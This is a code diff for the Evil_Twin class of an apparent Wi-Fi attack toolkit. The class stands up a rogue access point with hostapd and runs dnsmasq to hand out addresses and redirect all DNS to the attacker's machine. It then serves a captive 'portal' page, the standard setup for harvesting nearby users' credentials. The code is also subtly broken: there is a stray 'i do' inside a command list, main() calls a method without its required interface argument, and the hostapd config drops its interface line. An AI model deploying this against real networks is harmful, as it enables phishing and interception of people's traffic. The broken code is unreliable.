@@ -2331,19 +2331,37 @@ class Evil_Twin():
 
         return PORTAL_DIR, Path(BASE_DIR / "portals" / portal)
 
+
+    @staticmethod
+    def _kill_processes(color="bold red", delay=1):
+        """This method will kill any old and up and running processes"""
+
+        console.print(f"[{color}][*] Killing existing hostapd/dnsmasq processes")
+        subprocess.run(["pkill", "hostapd"], check=False, stderr=subprocess.DEVNULL)
+        subprocess.run(["pkill", "dnsmasq"], check=False, stderr=subprocess.DEVNULL)
+        time.sleep(delay)
   
+
     @classmethod
-    def _configure_ip(cls, iface):
+    def _configure_interface(cls, iface, gateway_ip="10.0.0.1"):
         """This will configure IP for evil twin"""
+        
+        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", iface, "up"], check=True)
+        subprocess.run(["ip", "addr", "flush", "dev", iface], check=True)
+        subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", iface], check=True)
+        subprocess.run(["ip", "link", "set", iface, "up"], check=True)
 
-        subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface], check=False)
-        subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
-        subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
+        result = subprocess.run(["ip", "addr", "show", iface],
+                              capture_output=True, text=True)
+        
+        if gateway_ip not in result.stdout: console.print(f"[bold red][!] Failed to set IP on {iface}"); return False
+
         console.print(f"[bold green][+] Configured {iface} with IP 10.0.0.1")
-
+    
 
     @classmethod
-    def _make_hostapd_conf(cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True):
+    def _create_hostapd_conf(cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True):
         """This will create hostpad_conf"""
 
 
@@ -2351,11 +2369,11 @@ class Evil_Twin():
 
             data_hostapd = dedent(
                 f"""
-                interface={iface}
                 driver=nl80211
                 ssid={ssid}
                 hw_mode=g
                 channel={channel}
+                macaddr_acl=0
                 auth_algs={auth_algs}
                 ignore_broadcast_ssid=0
                 """
@@ -2372,28 +2390,44 @@ class Evil_Twin():
     
   
     @classmethod
-    def _make_dnsmasq_conf(cls, path, iface, dhcp_range="10.0.0.10,10.0.0.100,12h", address="10.0.0.1", verbose=True):
+    def _create_dnsmasq_conf(cls, path, iface, dhcp_range_start="10.0.0.10", dhcp_range_end="10.0.0.100", gateway_ip="10.0.0.1", 
+                            dnsmasq_log="/var/log/dnsmasq_evil.log", dnsmasq_leases="/var/lib/misc/dnsmasq.leases",
+                            verbose=True):
         """This will create dnsmasq_conf"""
 
 
         try:
 
+            subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
+            subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
+            subprocess.run(["mkdir", "-p", "/var/log"], check=True)
+
+
+
             data_dnsmasq = dedent(
             f"""
             interface={iface}
             bind-interfaces
-            listen-address=10.0.0.1
+            listen-address={gateway_ip}
+
+            # DHCP
+            dhcp-range={dhcp_range_start},{dhcp_range_end},12h
+            dhcp-option=3,{gateway_ip}
+            dhcp-option=6,{gateway_ip}
             dhcp-authoritative
-            dhcp-range=10.0.0.10,10.0.0.100,12h
-            dhcp-option=3,10.0.0.1
-            dhcp-option=6,10.0.0.1
-            dhcp-leasefile=/var/lib/misc/dnsmasq.leases
-            address=/#/10.0.0.1
+
+            # DNS - Redirect ALL domains to our portal (wildcard)
+            address=/#/{gateway_ip}
             no-resolv
             no-hosts
-            log-queries
+
+            # Logging
             log-dhcp
-            log-facility=/var/log/dnsmasq_evil.log
+            log-queries
+            log-facility={dnsmasq_log}
+
+            # Lease file
+            dhcp-leasefile={dnsmasq_leases}
                 """).strip(); what = "dnsmasq.conf"
 
             path = str(path / "dnsmasq.conf")
@@ -2406,109 +2440,57 @@ class Evil_Twin():
 
 
     @classmethod
-    def _launch_hostapd(cls, path:str, verbose=True):
+    def _start_hostapd(cls, path:str, verbose=True):
         """This will launch hostapd"""
 
 
-        hostpad_proc = subprocess.Popen(
-            ["sudo","hostapd", path],
+        proc = subprocess.Popen(
+            ["hostapd", path],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
 
-        hostpad_proc
-        if verbose: console.print(f"[bold green][+] Successfully launched:[bold yellow] hostapd")
+        time.sleep(3)
+
+        if proc.poll() is not None:
+            console.print("[bold red][!] hostapd failed to start")
+            _, err = proc.communicate()
+            console.print(f"[bold red][-]Error: {err.decode()}")
+            return False
+
+        if verbose: console.print(f"[bold green][+] Successfully started:[bold yellow] hostapd"); return True
     
 
-
     @classmethod
-    def _launch_dnsmasq_new(cls, path: str, verbose=True):
+    def _start_dnsmasq(cls, path: str, verbose=True):
         """This will launch dnsmasq using /etc/dnsmasq.d/ so it doesn’t hit permission denied"""
 
-        try:
-            # Ensure the system config dir exists
-            subprocess.run(["sudo", "mkdir", "-p", "/etc/dnsmasq.d"], check=True)
-
-            # Define destination and copy config
-            system_conf = "/etc/dnsmasq.d/evil_twin.conf"
-            subprocess.run(["sudo", "cp", path, system_conf], check=True)
-
-            if verbose:
-                console.print(f"[bold green][+] Copied dnsmasq config to:[bold yellow] {system_conf}")
-
-            # Launch dnsmasq (system will auto-read /etc/dnsmasq.d/*.conf)
-            dnsmasq_proc = subprocess.Popen(
-                ["sudo", "dnsmasq", "-d"],  # foreground for debugging
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-
-            if verbose:
-                console.print(f"[bold green][+] Successfully launched:[bold yellow] dnsmasq")
-
-            # Allow it to initialize and print any errors
-            out, err = dnsmasq_proc.communicate(timeout=1)
-            if err:
-                console.print(f"[bold red][-] dnsmasq error:\n[bold yellow]{err.decode().strip()}")
-
-            return dnsmasq_proc
-
-        except subprocess.CalledProcessError as e:
-            console.print(f"[bold red][-] Command failed: {e.cmd}\n[bold yellow]{e.stderr}")
-        except subprocess.TimeoutExpired:
-            console.print(f"[bold yellow][!] dnsmasq is running in background.")
-            return dnsmasq_proc
-        except Exception as e:
-            console.print(f"[bold red][-] Failed to launch dnsmasq: [bold yellow]{e}")
-
-
-
-    @classmethod
-    def _launch_dnsmasq(cls, path:str, verbose=True):
-        """This will launch dnsmasq"""
-
-
-        dnsmasq_proc = subprocess.Popen(
-            ["sudo", "dnsmasq", "-C", path],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+        result = subprocess.run(
+            ["dnsmasq", "-C", path],
+            capture_output=True,
+            text=True
         )
 
-        dnsmasq_proc
-        if verbose: console.print(f"[bold green][+] Successfully launched:[bold yellow] dnsmasq")
+        if result.returncode != 0: console.print(f"[bold red][!] dnsmasq failed:[bold yellow] {result.stderr}"); return False
 
-        out, err = dnsmasq_proc.communicate(timeout=1)
-        print(err.decode())
+        time.sleep(1); check = subprocess.run(["pgrep", "dnsmasq"], capture_output=True)
 
+        if check.returncode != 0: console.print("[bold red][!] dnsmasq not running");                            return False
 
-    @classmethod
-    def _set_iptables(cls, verbose=True):
-        """This will redirct traffic"""
-
-        subprocess.run(
-            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-             "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
-             "--to-port", "8000"
-i do             ],
-            check=False  # Ignore errors if iptables nat table doesn't exist
-        )
-
-        if verbose: console.print(f"[bold green][+] Successfully configured:[bold yellow] iptables")
+        pid = check.stdout.decode().strip()
+        console.print(f"[bold green][+] Successfully started dnsmasq started (PID: {pid})");                     return True
 
 
     @classmethod
     def _terminate_instance(cls, iface):
         """This will cleanup all changes"""
 
-        subprocess.run(['sudo', 'pkill', 'hostapd'])
-        subprocess.run(['sudo', 'pkill', 'dnsmasq'])
-        subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', iface])
-        subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'])
-        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'])
-        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'])
-        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'])
-        subprocess.run(['sudo', 'iptables', '-F'])
-        console.print("[bold green][+] Interface cleaned up and restored.")
+        console.print("\n[bold yellow][*] Cleaning up...")
+        subprocess.run(["pkill", "hostapd"], check=False)
+        subprocess.run(["pkill", "dnsmasq"], check=False)
+        subprocess.run(["ip", "addr", "flush", "dev", iface], check=False)
+        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
+        console.print("[bold green][+] Interface clean up completed.")
     
 
 
@@ -2615,27 +2597,27 @@ i do             ],
     def main(cls):
         """This will control class wide logic"""
 
+
         
         try:
+
             iface = Frame_Snatcher.get_interface()
             Frame_Snatcher.welcome_ui(iface=iface, text=" Evil \nTwin", skip=True)
+            Background_Threads.change_iface_mode(iface=iface, mode="managed")
+            Background_Threads.channel_hopper(set_channel=6)
+
+            Evil_Twin._kill_processes()
+            Evil_Twin._configure_interface()
 
             portal, ssid = Evil_Twin._choose_portal()
             conf_path, path = Evil_Twin._get_portal_path(portal=portal); print('\n')
 
-            Evil_Twin._configure_ip(iface=iface)
-            #Background_Threads.channel_hopper(set_channel=6)
-
-
-            h = Evil_Twin._make_hostapd_conf(path=conf_path, iface=iface, ssid=ssid)
-            d = Evil_Twin._make_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2)
-            Evil_Twin._launch_hostapd(path=h)
-            Evil_Twin._launch_dnsmasq_new(path=d)
-
-            # Evil_Twin._set_iptables()  # Disabled - iptables nat table not available
+            path_hostapd = Evil_Twin._create_hostapd_conf(path=conf_path, iface=iface, ssid=ssid);     Evil_Twin._start_hostapd(path=path_hostapd)
+            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2); Evil_Twin._start_dnsmasq(path=path_dnsmasq)
 
             Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
         
+
         except KeyboardInterrupt: 
             Evil_Twin._terminate_instance(iface=iface)
             console.input("[bold red]\n\nPress enter to exit: ")
@@ -2655,11 +2637,6 @@ i do             ],
         7. Launch dnsmasq (DHCP server)
         8. Start HTTP server (captive portal)
         """
-
-
-
-    
-
 
 
 
